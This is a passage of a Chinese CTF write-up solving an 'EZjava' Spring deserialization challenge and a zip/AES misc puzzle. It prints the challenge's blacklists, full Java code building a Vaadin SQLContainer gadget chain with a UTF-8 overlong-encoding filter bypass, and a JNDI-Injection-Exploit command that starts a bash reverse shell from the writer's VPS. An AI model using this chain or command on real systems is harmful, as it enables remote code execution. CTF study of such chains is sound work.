class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.stereotype.Controller;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.GetMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.PostMapping;</span><br><span class=\"line\"><span class=\"keyword\">import</span> org.springframework.web.bind.annotation.RequestParam;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"meta\">@Controller</span></span><br><span class=\"line\"><span class=\"comment\">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/Controller/IndexController.class */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">IndexController</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> String string;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@GetMapping(&#123;&quot;/&quot;&#125;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">main</span><span class=\"params\">()</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;redirect:/index.html&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@PostMapping(&#123;&quot;/file&quot;&#125;)</span></span><br><span class=\"line\">    <span class=\"keyword\">public</span> String <span class=\"title function_\">index</span><span class=\"params\">(<span class=\"meta\">@RequestParam</span> String data)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        System.out.println(data);</span><br><span class=\"line\">        <span class=\"keyword\">if</span> (data == <span class=\"literal\">null</span> || data.equals(<span class=\"string\">&quot;&quot;</span>)) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;redirect:/error.html&quot;</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        string = data;</span><br><span class=\"line\">        deserialize(string);      <span class=\"comment\">//这里存在反序列化</span></span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"string\">&quot;redirect:/index.html&quot;</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> Object <span class=\"title function_\">deserialize</span><span class=\"params\">(String base64data)</span> &#123;</span><br><span class=\"line\">        <span class=\"keyword\">try</span> &#123;</span><br><span class=\"line\">            <span class=\"type\">byte</span>[] decode = Base64.getDecoder().decode(base64data.toString().replace(<span class=\"string\">&quot;\\r\\n&quot;</span>, <span class=\"string\">&quot;&quot;</span>));</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">payload</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">String</span>(decode);</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (<span class=\"keyword\">new</span> <span class=\"title class_\">normal</span>(payload).blacklist(payload)) &#123;\t\t<span class=\"comment\">//这里有黑名单</span></span><br><span class=\"line\">                <span class=\"type\">ByteArrayInputStream</span> <span class=\"variable\">byteArrayInputStream</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ByteArrayInputStream</span>(Base64.getDecoder().decode(base64data.toString().replace(<span class=\"string\">&quot;\\r\\n&quot;</span>, <span class=\"string\">&quot;&quot;</span>)));</span><br><span class=\"line\">                <span class=\"type\">ObjectInputStream</span> <span class=\"variable\">ois</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">MyObjectInputStream</span>(byteArrayInputStream);</span><br><span class=\"line\">                ois.readObject();</span><br><span class=\"line\">                ois.close();</span><br><span class=\"line\">                <span class=\"keyword\">return</span> ois;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"string\">&quot;redirect:/error.html&quot;</span>;</span><br><span class=\"line\">        &#125; <span class=\"keyword\">catch</span> (Exception e) &#123;</span><br><span class=\"line\">            e.printStackTrace();</span><br><span class=\"line\">            <span class=\"keyword\">return</span> <span class=\"literal\">null</span>;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t可以看到 /file 路由，直接把传入的 string 字符串反序列化，并且 string 是我们可控的，但是下面有黑名单</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.easyjava.challenge;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.UnsupportedEncodingException;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/normal.class */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">normal</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">normal</span><span class=\"params\">(String data)</span> <span class=\"keyword\">throws</span> UnsupportedEncodingException &#123;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"type\">boolean</span> <span class=\"title function_\">blacklist</span><span class=\"params\">(String data)</span> &#123;</span><br><span class=\"line\">        String[] blacklist = &#123;<span class=\"string\">&quot;BadAttributeValueExpException&quot;</span>, <span class=\"string\">&quot;Collections$UnmodifiableList&quot;</span>, <span class=\"string\">&quot;PropertysetItem&quot;</span>, <span class=\"string\">&quot;AbstractClientConnector&quot;</span>, <span class=\"string\">&quot;Enum&quot;</span>, <span class=\"string\">&quot;SQLContainer&quot;</span>, <span class=\"string\">&quot;LinkedHashMap&quot;</span>, <span class=\"string\">&quot;TableQuery&quot;</span>, <span class=\"string\">&quot;AbstractTransactionalQuery&quot;</span>, <span class=\"string\">&quot;J2EEConnectionPool&quot;</span>, <span class=\"string\">&quot;DefaultSQLGenerator&quot;</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String list : blacklist) &#123;</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (data.contains(list)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">return</span> <span class=\"literal\">false</span>;</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"literal\">true</span>;</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t发现常用的 BadAttributeValueExpException</p>\n<p>​\t\t后面这里重写了 ObjectInputStream 类，看一下 MyObjectInputStream 做了哪些过滤</p>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.easyjava.challenge;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.IOException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.InvalidClassException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectInputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.ObjectStreamClass;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\">/* loaded from: EZjava.jar:BOOT-INF/classes/com/example/easyjava/challenge/MyObjectInputStream.class */</span></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">MyObjectInputStream</span> <span class=\"keyword\">extends</span> <span class=\"title class_\">ObjectInputStream</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"title function_\">MyObjectInputStream</span><span class=\"params\">(InputStream in)</span> <span class=\"keyword\">throws</span> IOException &#123;</span><br><span class=\"line\">        <span class=\"built_in\">super</span>(in);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    <span class=\"meta\">@Override</span> <span class=\"comment\">// java.io.ObjectInputStream</span></span><br><span class=\"line\">    <span class=\"keyword\">protected</span> Class&lt;?&gt; resolveClass(ObjectStreamClass desc) <span class=\"keyword\">throws</span> IOException, ClassNotFoundException &#123;</span><br><span class=\"line\">        <span class=\"type\">String</span> <span class=\"variable\">className</span> <span class=\"operator\">=</span> desc.getName().toLowerCase();</span><br><span class=\"line\">        String[] denyClasses = &#123;<span class=\"string\">&quot;java.net.InetAddress&quot;</span>, <span class=\"string\">&quot;org.apache.commons.collections.Transformer&quot;</span>, <span class=\"string\">&quot;org.apache.commons.collections.functors&quot;</span>, <span class=\"string\">&quot;C3P0&quot;</span>, <span class=\"string\">&quot;Jackson&quot;</span>, <span class=\"string\">&quot;NestedMethodProperty&quot;</span>, <span class=\"string\">&quot;TemplatesImpl&quot;</span>&#125;;</span><br><span class=\"line\">        <span class=\"keyword\">for</span> (String str : denyClasses) &#123;</span><br><span class=\"line\">            <span class=\"type\">String</span> <span class=\"variable\">denyClass</span> <span class=\"operator\">=</span> str.toLowerCase();</span><br><span class=\"line\">            <span class=\"keyword\">if</span> (className.contains(denyClass)) &#123;</span><br><span class=\"line\">                <span class=\"keyword\">throw</span> <span class=\"keyword\">new</span> <span class=\"title class_\">InvalidClassException</span>(<span class=\"string\">&quot;Unauthorized deserialization attempt&quot;</span>, className);</span><br><span class=\"line\">            &#125;</span><br><span class=\"line\">        &#125;</span><br><span class=\"line\">        <span class=\"keyword\">return</span> <span class=\"built_in\">super</span>.resolveClass(desc);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>​\t\t到这里常用的 spring、jackson 的链子都打不通了，只能看关于 vaadin 依赖的链子，网上公开的是 NestedMethodProperty 和 SQLContainer 这俩条链子，但是在 resolveClass 中 NestedMethodProperty 类在黑名单中无法使用</p>\n<p>​\t\t所以可以确定用 SQLContainer 链子，blacklist 黑名单的内容这里直接可以用 utf-8 编码来绕即可（网上的 SQLContainer 不太完整，需要手动本地调试一下），本题是出网的直接用 JDBCConnectionPool 类打 JNDI 注入即可</p>\n<blockquote>\n<p>JDBCConnectionPool#reserveConnection</p>\n<p>​\t\tgetConnection</p>\n<p>​\t\t\t\t TableQuery#  beginTransaction</p>\n<p>​\t\t\t\t\t\tTableQuery#containsRowWithkey</p>\n<p>​\t\t\t\t\t\t\t\t containsId  （item 可控，item.getId 值 ==TableQuery）</p>\n<p>​\t\t\t\t\t\t\t\t\t\t getValue   ----- 这一层，item  == sqlcontainer</p>\n<p>​\t\t\t\t\t\t\t\t\t\t\t\ttoString</p>\n</blockquote>\n<figure class=\"highlight java\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">package</span> com.example.Utils;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.Utils.ReflectionUtil;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.example.Utils.SerializeUtil;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.utf.CustomObjectOutputStream;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.PropertysetItem;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.CacheMap;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.RowId;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.RowItem;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.SQLContainer;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.connection.J2EEConnectionPool;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.query.QueryDelegate;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.query.TableQuery;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.data.util.sqlcontainer.query.generator.DefaultSQLGenerator;</span><br><span class=\"line\"><span class=\"keyword\">import</span> com.vaadin.ui.ListSelect;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">import</span> javax.management.BadAttributeValueExpException;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.io.*;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.ArrayList;</span><br><span class=\"line\"><span class=\"keyword\">import</span> java.util.Base64;</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">public</span> <span class=\"keyword\">class</span> <span class=\"title class_\">test</span> &#123;</span><br><span class=\"line\">    <span class=\"keyword\">public</span>  <span class=\"keyword\">static</span> String string=<span class=\"string\">&quot;&quot;</span>;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">main</span><span class=\"params\">(String[] args)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">J2EEConnectionPool</span> <span class=\"variable\">pool</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">J2EEConnectionPool</span>(<span class=\"string\">&quot;ldap://&quot;</span>);</span><br><span class=\"line\">        <span class=\"type\">TableQuery</span> <span class=\"variable\">tableQuery</span> <span class=\"operator\">=</span> (TableQuery) </span><br><span class=\"line\">ReflectionUtil.createWithoutConstructor(Class.forName(<span class=\"string\">&quot;com.vaadin.data.util.sqlconta</span></span><br><span class=\"line\"><span class=\"string\"> iner.query.TableQuery&quot;</span>));</span><br><span class=\"line\">        ReflectionUtil.setField(tableQuery, <span class=\"string\">&quot;primaryKeyColumns&quot;</span>, <span class=\"keyword\">new</span> <span class=\"title class_\">ArrayList</span>&lt;&gt;());</span><br><span class=\"line\">        ReflectionUtil.setField(tableQuery, <span class=\"string\">&quot;fullTableName&quot;</span>, <span class=\"string\">&quot;test&quot;</span>);</span><br><span class=\"line\">        ReflectionUtil.setField(tableQuery, <span class=\"string\">&quot;sqlGenerator&quot;</span>, <span class=\"keyword\">new</span> </span><br><span class=\"line\"><span class=\"title class_\">DefaultSQLGenerator</span>());</span><br><span class=\"line\">        ReflectionUtil.setField(tableQuery, <span class=\"string\">&quot;connectionPool&quot;</span>, pool);</span><br><span class=\"line\">        <span class=\"type\">ListSelect</span> <span class=\"variable\">listSelect</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">ListSelect</span>();</span><br><span class=\"line\">        <span class=\"type\">SQLContainer</span> <span class=\"variable\">sql</span> <span class=\"operator\">=</span> (SQLContainer) </span><br><span class=\"line\">ReflectionUtil.createObject(<span class=\"string\">&quot;com.vaadin.data.util.sqlcontainer.SQLContainer&quot;</span>, <span class=\"keyword\">new</span> </span><br><span class=\"line\"><span class=\"title class_\">Class</span>[]&#123;&#125;, <span class=\"keyword\">new</span> <span class=\"title class_\">Object</span>[]&#123;&#125;);</span><br><span class=\"line\">        ReflectionUtil.setField(sql, <span class=\"string\">&quot;queryDelegate&quot;</span>, tableQuery);</span><br><span class=\"line\">        ReflectionUtil.setField(sql,<span class=\"string\">&quot;cachedItems&quot;</span>,<span class=\"keyword\">new</span> <span class=\"title class_\">CacheMap</span>&lt;&gt;());</span><br><span class=\"line\">        <span class=\"type\">RowId</span> <span class=\"variable\">id</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">RowId</span>(<span class=\"string\">&quot;id&quot;</span>);</span><br><span class=\"line\">        ReflectionUtil.setField(listSelect, <span class=\"string\">&quot;value&quot;</span>, id);</span><br><span class=\"line\">        ReflectionUtil.setField(listSelect, <span class=\"string\">&quot;multiSelect&quot;</span>, <span class=\"literal\">true</span>);</span><br><span class=\"line\">        ReflectionUtil.setField(listSelect, <span class=\"string\">&quot;items&quot;</span>, sql);</span><br><span class=\"line\">        <span class=\"type\">PropertysetItem</span> <span class=\"variable\">propertysetItem</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">PropertysetItem</span>();</span><br><span class=\"line\">        propertysetItem.addItemProperty(<span class=\"string\">&quot;key&quot;</span>, listSelect);</span><br><span class=\"line\">        <span class=\"type\">BadAttributeValueExpException</span> <span class=\"variable\">bad</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">BadAttributeValueExpException</span>(<span class=\"number\">0</span>);</span><br><span class=\"line\">        ReflectionUtil.setField(bad, <span class=\"string\">&quot;val&quot;</span>, propertysetItem);</span><br><span class=\"line\">        serialize2(bad);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    <span class=\"keyword\">public</span> <span class=\"keyword\">static</span> <span class=\"keyword\">void</span> <span class=\"title function_\">serialize2</span><span class=\"params\">(Object obj)</span> <span class=\"keyword\">throws</span> Exception &#123;</span><br><span class=\"line\">        <span class=\"type\">CustomObjectOutputStream</span> <span class=\"variable\">oos</span> <span class=\"operator\">=</span> <span class=\"keyword\">new</span> <span class=\"title class_\">CustomObjectOutputStream</span>(<span class=\"keyword\">new</span> </span><br><span class=\"line\"><span class=\"title class_\">FileOutputStream</span>(<span class=\"string\">&quot;ser.bin&quot;</span>));</span><br><span class=\"line\">        oos.writeObject(obj);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"> &#125;</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\tCustomObjectOutputStream 类是网上公开的 utf-8 编码绕过（网上的有的没有对数字进行编码会导致报错， 可参考 P 神的文章 https://www.leavesongs.com/PENETRATION/utf-8-overlong-encoding.html  用 python 脚 本生成即可）</p>\n<p>​\t\t在 vps 上开启一个恶意的服务器：</p>\n<figure class=\"highlight shell\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">java -jar JNDI-Injection-Exploit-Plus-2.4-SNAPSHOT-all.jar -C &quot;bash -c &#123;echo,&#125;| &#123;base64,-d&#125;|&#123;bash,-i&#125;&quot;</span><br></pre></td></tr></table></figure>\n<p>​\t\t开启反弹 shell 监听的端口，最后在根目录获取 flag</p>\n<p><img data-src=\"https://i-blog.csdnimg.cn/direct/d1555696b9964e9397405fd9cab4f124.png#pic_center\" alt=\"在这里插入图片描述\"></p>\n<h2 id=\"misc\"><a class=\"markdownIt-Anchor\" href=\"#misc\">#</a> Misc：</h2>\n<h3 id=\"简单的压缩包\"><a class=\"markdownIt-Anchor\" href=\"#简单的压缩包\">#</a> 简单的压缩包：</h3>\n<p>​\t\t打开之后有个 Re，打开发现是一个正则表达式：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">^([a-z])&#123;<span class=\"number\">2</span>&#125;\\d\\d([^a-z])$</span><br></pre></td></tr></table></figure>\n<p>​\t\t前面两个是字符，第三四个是数字，第五个不是小写字母，根据这个生成个字典：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">str_12 = <span class=\"string\">&quot;abcdefghijklmnopqrstuvwxyz&quot;</span></span><br><span class=\"line\">digit = <span class=\"string\">&quot;0123456789&quot;</span></span><br><span class=\"line\">str_4 = <span class=\"string\">&quot;&quot;&quot;ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789!&quot;#$&amp;&#x27;()*+,-./:;&lt;=&gt;?@[\\]^_`&#123;|&#125;~&quot;&quot;&quot;</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;dict.txt&quot;</span>,<span class=\"string\">&quot;w&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    <span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> str_12:</span><br><span class=\"line\">        <span class=\"keyword\">for</span> j <span class=\"keyword\">in</span> str_12:</span><br><span class=\"line\">            <span class=\"keyword\">for</span> k <span class=\"keyword\">in</span> digit:</span><br><span class=\"line\">                <span class=\"keyword\">for</span> m <span class=\"keyword\">in</span> digit:</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> n <span class=\"keyword\">in</span> str_4:</span><br><span class=\"line\">                        dic =i+j+k+m</span><br><span class=\"line\">                        f.write(dic+<span class=\"string\">&quot;\\n&quot;</span>)</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后拿着这个去爆破，爆破到密码，不过这里非预期了，竟然可以用明文攻击，师傅们简直太强了，不过这里因为失去某些信息导致爆破难度增大也是我的锅：</p>\n<figure class=\"highlight txt\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">np76_</span><br></pre></td></tr></table></figure>\n<p>​\t\t之后就是 png，winhex 发现藏了有文件，foremost 分离，分离后看到了个 py 文件和一个压缩包：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> pad, unpad</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">encrypt</span>(<span class=\"params\">key,iv</span>):</span><br><span class=\"line\">    data = content</span><br><span class=\"line\">    cipher1 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">    ct = cipher1.encrypt(pad(data, <span class=\"number\">16</span>))</span><br><span class=\"line\">    ct_hex = binascii.b2a_hex(ct)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> ct_hex</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;oringe.zip&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    content = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">b&quot;abcdefghijklmnop&quot;</span></span><br><span class=\"line\">iv  = <span class=\"string\">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\">en = encrypt(key,iv)</span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;zip2.zip&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    f.write(en)</span><br><span class=\"line\"></span><br></pre></td></tr></table></figure>\n<p>​\t\t显然，压缩包被加密了，AES 加密和 key 都有，直接打：</p>\n<figure class=\"highlight python\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br></pre></td><td class=\"code\"><pre><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Cipher <span class=\"keyword\">import</span> AES</span><br><span class=\"line\"><span class=\"keyword\">from</span> Crypto.Util.Padding <span class=\"keyword\">import</span> pad, unpad</span><br><span class=\"line\"><span class=\"keyword\">import</span> binascii</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"keyword\">def</span> <span class=\"title function_\">decrypt</span>(<span class=\"params\">ct_hex,key,iv</span>):</span><br><span class=\"line\">    cipher2 = AES.new(key, AES.MODE_CBC, iv)</span><br><span class=\"line\">    hex_data = binascii.a2b_hex(ct_hex)</span><br><span class=\"line\">    pt = unpad(cipher2.decrypt(hex_data), <span class=\"number\">16</span>)</span><br><span class=\"line\">    <span class=\"keyword\">return</span> pt</span><br><span class=\"line\"></span><br><span class=\"line\">key = <span class=\"string\">b&quot;abcdefghijklmnop&quot;</span></span><br><span class=\"line\">iv  = <span class=\"string\">b&quot;qwertyuiopasdfgh&quot;</span></span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 加密的zip文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;jiami.zip&quot;</span>,<span class=\"string\">&quot;rb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    endata = f.read()</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"comment\"># 新建的解密zip文件</span></span><br><span class=\"line\"><span class=\"keyword\">with</span> <span class=\"built_in\">open</span>(<span class=\"string\">&quot;jiemi.zip&quot;</span>,<span class=\"string\">&quot;wb&quot;</span>) <span class=\"keyword\">as</span> f:</span><br><span class=\"line\">    dedata = decrypt(endata,key,iv)</span><br><span class=\"line\">    f.write(dedata)</span><br></pre></td></tr></table></figure>\n<p>​\t\t9 解压后就有 flag 了。</p>\n<figure class=\"highlight tex\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">HECTF&#123;c292af1-2b2ee35-6398bd4934f7626afc&#125;</span><br></pre></td></tr></table></figure>\n<p>​</p>\n<h2 id=\"pwn\"><a class=\"markdownIt-Anchor\" href=\"#pwn\">#</a> Pwn</h2>\n<h3 id=\"sign-in\"><a class=\"markdownIt-Anchor\" href=\"#sign-in\">#</a> sign 